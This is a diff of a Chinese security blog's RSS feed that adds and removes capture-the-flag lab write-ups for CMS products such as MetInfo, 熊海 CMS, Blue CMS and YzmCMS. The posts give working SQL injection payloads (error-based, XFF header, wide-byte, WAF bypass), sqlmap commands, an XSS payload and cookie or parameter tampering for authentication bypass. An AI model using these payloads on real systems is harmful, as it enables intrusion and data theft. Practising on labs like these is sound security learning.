@@ -1,25 +1,67 @@
 <?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>null</title>
+    <title>路边社周刊</title>
     <link>https://xxxhidexxx.github.io/</link>
-    <description>Recent content on null</description>
+    <description>Recent content on 路边社周刊</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>null</copyright>
-    <lastBuildDate>Mon, 11 Mar 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 13 Mar 2024 00:00:00 +0000</lastBuildDate>
     
         <atom:link href="https://xxxhidexxx.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     
     
         <item>
-        <title>vlCMS 无密码登录</title>
+        <title>MetInfo v4.0 越权修改密码</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/lo4/</link>
+        <pubDate>Wed, 13 Mar 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/lo4/</guid>
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo4/ -&lt;p&gt;这个靶场演示的是 MetInfo v4.0 的 nday。&lt;/p&gt;
+&lt;p&gt;先注册一个账号，找到修改密码，然后抓包。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-0.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-1.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将 userid 改为任意用户，密码自己设置。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-2.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用其他人的用户名和自己设置的密码，成功登录到其他人的账号。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-3.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进入个人中心找到 flag=ywaq{uhgJHzxdIG}。&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/lo4/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>熊海 CMS v1.0 越权登录管理员账号</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/lo5/</link>
+        <pubDate>Wed, 13 Mar 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/lo5/</guid>
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo5/ -&lt;p&gt;漏洞原理：我们添加一个用来占位的 cookie 保证 cookie 不为空，即可越权访问后台，并且可以避免跳转回登录页面。&lt;/p&gt;
+&lt;p&gt;这个靶场演示的是熊海 CMS v1.0 的越权漏洞。&lt;/p&gt;
+&lt;p&gt;尝试将 url 中的 ?r=login 改为 ?r=index 直接进后台，发现无效，会跳回登录页面。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-0.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;开 burp 拦截，在 cookie 中添加 user，值可以任意输入，例如将 &lt;code&gt;Cookie: PHPSESSID=b58boijgnqf8hcg1f62rgb94c3&lt;/code&gt; 改为 &lt;code&gt;Cookie: PHPSESSID=b58boijgnqf8hcg1f62rgb94c3；user=123&lt;/code&gt; 同时将 url 参数改为 ?r=index。发现直接进入管理员后台。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-1.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-2.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们刚才是用 burp 抓包修改 cookie，这个 cookie 没有保存，无法真正进入后台页面，随便点一个按钮就跳转回登录页面。因此我们用 cookie-editor 插件添加一个 user 并保存。就可以直接输入 url 越权访问管理员后台，也可以修改管理员账号密码。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-3.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-4.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;得到 flag=ywaq{xionghai-czyq}。（其实这个 flag 首页点评论就能看到，不需要操作。）&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/lo5/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>vl CMS 无密码登录</title>
         <link>https://xxxhidexxx.github.io/posts/sec/lo3/</link>
         <pubDate>Mon, 11 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/lo3/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/lo3/ -&lt;p&gt;打开靶场页面如下。&lt;/p&gt;
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo3/ -&lt;p&gt;打开靶场页面如下。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo3-1.png&#34; alt=&#34;lo3&#34;&gt;&lt;/p&gt;
 &lt;p&gt;利用 nday 已知信息，将 url 修改为 index.php?s=/member/res_login/ 并抓包。&lt;/p&gt;
 &lt;p&gt;将 GET 改为 POST 并在结尾加上 id=1。&lt;/p&gt;
@@ -27,6 +69,7 @@
 &lt;p&gt;回到主页刷新，发现已经登录到其他人的账号。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo3-3.png&#34; alt=&#34;lo3&#34;&gt;&lt;/p&gt;
 &lt;p&gt;进入个人中心得到 flag=ywaq{uhgzxdygfh}。&lt;/p&gt;
+&lt;p&gt;添加 &amp;amp;id=1 是常用绕过手法。&lt;/p&gt;
 - https://xxxhidexxx.github.io/posts/sec/lo3/ - null</description>
         </item>
     
@@ -38,7 +81,7 @@
         <pubDate>Sun, 10 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/lo2/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/lo2/ -&lt;p&gt;我们打开这个 easyCMS 的靶场，为了测试支付逻辑，先随便注册一个账户并登录。&lt;/p&gt;
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo2/ -&lt;p&gt;我们打开这个 easyCMS 的靶场，为了测试支付逻辑，先随便注册一个账户并登录。&lt;/p&gt;
 &lt;p&gt;打开购买商品的页面，尝试修改数量为负，发现有前端拦截。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo2-4.png&#34; alt=&#34;lo2&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo2-5.png&#34; alt=&#34;lo2&#34;&gt;&lt;/p&gt;
@@ -58,7 +101,7 @@
         <pubDate>Sun, 10 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/lo1/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/lo1/ -&lt;p&gt;打开大米 CMS 的靶场，找到支付页面。提示必须登录才可以继续下一步，我们随便注册一个账户即可。&lt;/p&gt;
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/lo1/ -&lt;p&gt;打开大米 CMS 的靶场，找到支付页面。提示必须登录才可以继续下一步，我们随便注册一个账户即可。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-1.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;首先发现这个数量可以直接修改成 -1，但是提交无效。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-4.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
@@ -74,12 +117,12 @@
     
     
         <item>
-        <title>YzmCMS 存在反射型 XSS</title>
+        <title>Yzm CMS 存在反射型 XSS</title>
         <link>https://xxxhidexxx.github.io/posts/sec/xss1/</link>
         <pubDate>Sat, 09 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/xss1/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/xss1/ -&lt;p&gt;YzmCMS 主页面的搜索功能有三个参数，这三个参数都存在反射性 xss。&lt;/p&gt;
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/xss1/ -&lt;p&gt;YzmCMS 主页面的搜索功能有三个参数，这三个参数都存在反射性 xss。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/xss/xss0-0.png&#34; alt=&#34;xss1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;没有过滤，我们插入常规 payload 即可。&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;lt;img src=a onerror=alert(1)&amp;gt;
@@ -91,12 +134,12 @@
     
     
         <item>
-        <title>SQL 注入绕过 WAF</title>
+        <title>SQL 注入绕 WAF</title>
         <link>https://xxxhidexxx.github.io/posts/sec/sqli9/</link>
         <pubDate>Wed, 06 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli9/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/sqli9/ -&lt;p&gt;这个靶场演示的是最新版安全狗。&lt;/p&gt;
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli9/ -&lt;p&gt;这个靶场演示的是最新版安全狗。&lt;/p&gt;
 &lt;p&gt;我们输入单引号，and，等号之类的字符都会被拦截。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli9-1.png&#34; alt=&#34;sqli9&#34;&gt;&lt;/p&gt;
 &lt;p&gt;利用内联注释构造如下 payload，即可成功绕过这个拦截。&lt;/p&gt;
@@ -121,7 +164,7 @@
         <pubDate>Wed, 06 Mar 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli8/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/sqli8/ -&lt;p&gt;起因。网站开发防止 SQL 注入添加了 PHP 函数：addslashes()。php语言中的addslashes()函数在指定的预定义字符前添加反斜杠，这些字符是单引号(&amp;rsquo;)，双引号(&amp;quot;)，反斜线（\）与NUL（NULL字符）。例如客户端提交的参数中如果含有单引号，双引号等这些特殊字符，addslashes 函数则会在单引号前加反斜线“\”，将单引号转义成没有功能性的字符。&lt;/p&gt;
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli8/ -&lt;p&gt;起因。网站开发防止 SQL 注入添加了 PHP 函数：addslashes()。php语言中的addslashes()函数在指定的预定义字符前添加反斜杠，这些字符是单引号(&amp;rsquo;)，双引号(&amp;quot;)，反斜线（\）与NUL（NULL字符）。例如客户端提交的参数中如果含有单引号，双引号等这些特殊字符，addslashes 函数则会在单引号前加反斜线“\”，将单引号转义成没有功能性的字符。&lt;/p&gt;
 &lt;p&gt;构造 payload：
 %df&amp;rsquo; or 1=1 &amp;ndash; qwe
 %df&amp;rsquo; or 1=0 &amp;ndash; qwe&lt;/p&gt;
@@ -139,7 +182,7 @@
         <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli7/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/sqli7/ -&lt;h2 id=&#34;注入点&#34;&gt;注入点&lt;/h2&gt;
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli7/ -&lt;h2 id=&#34;注入点&#34;&gt;注入点&lt;/h2&gt;
 &lt;p&gt;第一次见到这种注入点。我们在搜索框输入 t 然后抓包，这是为了保证返回的搜索内容不为空。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-4.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
 &lt;p&gt;发现 sertype 变量在加入恒真恒伪后提供了一个布尔盲注点位。&lt;/p&gt;
@@ -196,7 +239,7 @@ sertype=1 and 1=2;#&amp;amp;search=t&amp;amp;sub=%E6%90%9C%E7%B4%A2
         <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli6/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/sqli6/ -&lt;h2 id=&#34;语法报错&#34;&gt;语法报错&lt;/h2&gt;
+        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli6/ -&lt;h2 id=&#34;语法报错&#34;&gt;语法报错&lt;/h2&gt;
 &lt;p&gt;下述 payload 可以直接复制使用。&lt;/p&gt;
 &lt;h3 id=&#34;extractvalue&#34;&gt;extractvalue()&lt;/h3&gt;
 &lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and &#39;1&#39;=&#39;1
@@ -224,169 +267,6 @@ sertype=1 and 1=2;#&amp;amp;search=t&amp;amp;sub=%E6%90%9C%E7%B4%A2
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-1.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-2.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
 - https://xxxhidexxx.github.io/posts/sec/sqli6/ - null</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>Blue CMS v1.6 留言区存在 XFF 伪造漏洞</title>
-        <link>https://xxxhidexxx.github.io/posts/sec/sqli5/</link>
-        <pubDate>Thu, 15 Feb 2024 00:00:00 +0000</pubDate>
-        
-        <guid>https://xxxhidexxx.github.io/posts/sec/sqli5/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/sqli5/ -&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
-&lt;p&gt;这是个靶场，提示 header 注入。打开网页的留言区发现了留言显示 ip 地址，因此想到伪造 X-FORWARDED-FOR。最终我们在留言区将留言作为回显拿到了 flag。&lt;/p&gt;
-&lt;h2 id=&#34;找到注入点&#34;&gt;找到注入点&lt;/h2&gt;
-&lt;p&gt;打开靶场后看到如下界面。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli5-5.png&#34; alt=&#34;sqli5&#34;&gt;&lt;/p&gt;
-&lt;p&gt;发现可以用弱口令登录管理员后台。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli5-6.png&#34; alt=&#34;sqli5&#34;&gt;&lt;/p&gt;
-&lt;p&gt;如果是真实场景我们可以考虑尝试在后台挖别的漏洞，但是考虑到靶场提示 flag 用到 http-header 做 sql 注入，我们考虑先回原来的网站尝试寻找能显示 ip 的地方。&lt;/p&gt;
-&lt;p&gt;（事后发现登录管理员权限也是有意义的，主要是在拿到 flag 之后删除痕迹，逃离肇事现场。）&lt;/p&gt;
-&lt;p&gt;回到原来的页面，找到留言区，发现提交留言会显示 ip 地址。我们用 burp 抓包后在请求里面人为添加一行 xff 进行伪造。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;POST /guest_book.php HTTP/1.1
-Host: 111.9.41.91:53005
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
-X-FORWARDED-FOR: &#39;
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 36
-Origin: http://111.9.41.91:53005
-Connection: close
-Referer: http://111.9.41.91:53005/guest_book.php
-Cookie: __tins__713776=%7B%22sid%22%3A%201708012726639%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201708014526639%7D; __51cke__=; __51laig__=1; PHPSESSID=eigkieftqj4bb7qg3frjdtav35; admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; detail=1
-Upgrade-Insecure-Requests: 1
-
-content=test&amp;amp;act=send&amp;amp;rid=&amp;amp;page_id=1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;我们在 xff 处分别写单引号和 0.0.0.0，看到如下响应。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli5-3.png&#34; alt=&#34;sqli5&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli5-4.png&#34; alt=&#34;sqli5&#34;&gt;&lt;/p&gt;
-&lt;p&gt;如上图所示，我们输入的 0.0.0.0 成功替换了网页上的 ip 显示，而单引号引起报错，我们还看到了网站的 insert 语句。现在我们确定 xff 存在注入点。&lt;/p&gt;
-&lt;h2 id=&#34;构造-payload&#34;&gt;构造 payload&lt;/h2&gt;
-&lt;p&gt;我们利用看到的报错提示构造 payload。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Error：Query error:
-INSERT INTO blue_guest_book (id, rid, user_id, add_time, ip, content) 
-		VALUES (&#39;&#39;, &#39;0&#39;, &#39;1&#39;, &#39;1708020440&#39;, &#39;
-1&#39;,(select schema_name from information_schema.schemata limit 0,1)),(&#39;&#39;, &#39;0&#39;, &#39;1&#39;, &#39;1708020440&#39;, &#39;0
-&#39;, &#39;test&#39;)&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;我们的 payload 闭合了前后的引号和括号，理论上会将信息打印在留言区。考虑到留言区没有字数限制，直接使用 group_concat 进行打印。分别构造如下 payload。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;X-FORWARDED-FOR: 1&#39;,(select group_concat(schema_name) from information_schema.schemata)),(&#39;&#39;, &#39;0&#39;, &#39;1&#39;, &#39;1708020440&#39;, &#39;0
-
-X-FORWARDED-FOR: 1&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;flag_db&#39;)),(&#39;&#39;, &#39;0&#39;, &#39;1&#39;, &#39;1708020440&#39;, &#39;0
-
-X-FORWARDED-FOR: 1&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;flag_db&#39; and table_name=&#39;flag&#39;)),(&#39;&#39;, &#39;0&#39;, &#39;1&#39;, &#39;1708020440&#39;, &#39;0
-
-X-FORWARDED-FOR: 1&#39;,(select value from flag_db.flag)),(&#39;&#39;, &#39;0&#39;, &#39;1&#39;, &#39;1708020440&#39;, &#39;0
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;看到如下成功的回显。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli5-0.png&#34; alt=&#34;sqli5&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli5-2.png&#34; alt=&#34;sqli5&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli5-1.png&#34; alt=&#34;sqli5&#34;&gt;&lt;/p&gt;
-&lt;p&gt;至此得到 flag=ywaq{IuzxdoJgVd}。&lt;/p&gt;
-&lt;h2 id=&#34;其他&#34;&gt;其他&lt;/h2&gt;
-&lt;p&gt;一开始用 sqlmap 跑了半天没跑出来，其实这个靶场手工比脚本好很多。一方面是因为 sqlmap 只会缘木求鱼，而我们的 payload 是利用报错信息构造的，sqlmap 没这么智能。另一方面脚本会在页面留下大量垃圾数据，如果没有管理员权限还删不掉。&lt;/p&gt;
-- https://xxxhidexxx.github.io/posts/sec/sqli5/ - null</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>熊海 CMS v1.0 后台登录存在 SQL 注入</title>
-        <link>https://xxxhidexxx.github.io/posts/sec/sqli4/</link>
-        <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
-        
-        <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
-        <description>null https://xxxhidexxx.github.io/posts/sec/sqli4/ -&lt;p&gt;这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。&lt;/p&gt;
-&lt;p&gt;有必要说的是，这个登录页面是个弱口令，但是急于用弱口令登录进去就会错过外面这个登录页面的漏洞。&lt;/p&gt;
-&lt;p&gt;最终我们发现这个登录页面存在 sql 注入，可以在不登录的情况下借助外带的语法报错拿到数据库信息。&lt;/p&gt;
-&lt;h2 id=&#34;语法回顾&#34;&gt;语法回顾&lt;/h2&gt;
-&lt;p&gt;我们使用 extractvalue() 和 concat() 这两个函数引起报错。&lt;/p&gt;
-&lt;p&gt;extractvalue(xml_frag,xpath_expr) 是 mysql 的 xml 函数，有两个字符串参数，我们写 extractvalue(1,concat(&amp;hellip;)) 就可以了。concat() 就是拼接字符串，我们写一个 0x5c 或者 0x7e 就会引起路径错误，payload 如下。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(
-    0x5c,
-    0x7e,
-    (select value from flag_db.flag limit 0,1),
-    0x7e
-    )) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;同样是 xml 函数的 updatexml() 可以替代 extractvalue()，payload 如下。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and updatexml(1,concat(
-    0x5c,
-    0x7e,
-    (select value from flag_db.flag limit 0,1),
-    0x7e
-),1) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;在这两个 xml 函数用不了的时候用 floor() 报错也可以，但是写起来会比较麻烦，payload 如下。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and (select 1 from (select count(*),concat(
-        (select value from flag_db.flag limit 0,1),
-        0x2b,
-        floor(rand(0)*2)
-    )x from information_schema.tables 
-    group by x)a) 
-and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;上述 payload 的成功效果如下图所示。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-14.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-13.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-12.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;手工注入&#34;&gt;手工注入&lt;/h2&gt;
-&lt;p&gt;登录页面如下。首先我们输入单引号发现报错，这说明 user 可能存在 post 注入。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-6.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-7.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;考虑到有报错页面但是没有回显点，我们用 extractvalue() 进行注入，旨在引起语法错误。构造如下 payload。&lt;/p&gt;
-&lt;p&gt;首先爆数据库名称。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
-    select schema_name from information_schema.schemata 
-        limit 0,1
-),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-9.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;令 limit 0,1 中的 0 遍历 0~4 可以爆出所有数据库名称后，打开 flag_db 查询表名。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
-    select table_name from information_schema.tables 
-        where table_schema=&#39;flag_db&#39;
-),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-8.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后查询字段。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
-    select column_name from information_schema.columns 
-        where table_schema=&#39;flag_db&#39; and table_name=&#39;flag&#39;
-        limit 0,1
-),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-10.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;最终拿到 flag=ywaq{okjzxdHdsa}。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
-    select value from flag_db.flag 
-        limit 0,1
-),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-11.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;用-sqlmap-扫描&#34;&gt;用 sqlmap 扫描&lt;/h2&gt;
-&lt;p&gt;使用的 sqlmap 语句如下。&amp;ndash;forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch --dbs
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&amp;ndash;dbs 的意思是列出所有数据库名称&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch -D flag_db --dump
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;-D 是指定数据库，&amp;ndash;dump 是以文件形式导出。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-0.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-1.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-2.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;其他发现&#34;&gt;其他发现&lt;/h2&gt;
-&lt;p&gt;这里 sqlmap 提示存在时间盲注。我们用子查询输入&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&#39; and (select qwe from (select(sleep(10)))qwe) -- qwe
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;可以看到延迟有效。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-5.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;但是我们发现这里的 sleep 必须用上述语句提高优先级，如果只输入 &lt;code&gt;&#39; and sleep(10) -- qwe&lt;/code&gt; 则无效。&lt;/p&gt;
-- https://xxxhidexxx.github.io/posts/sec/sqli4/ - null</description>
         </item>
     
     
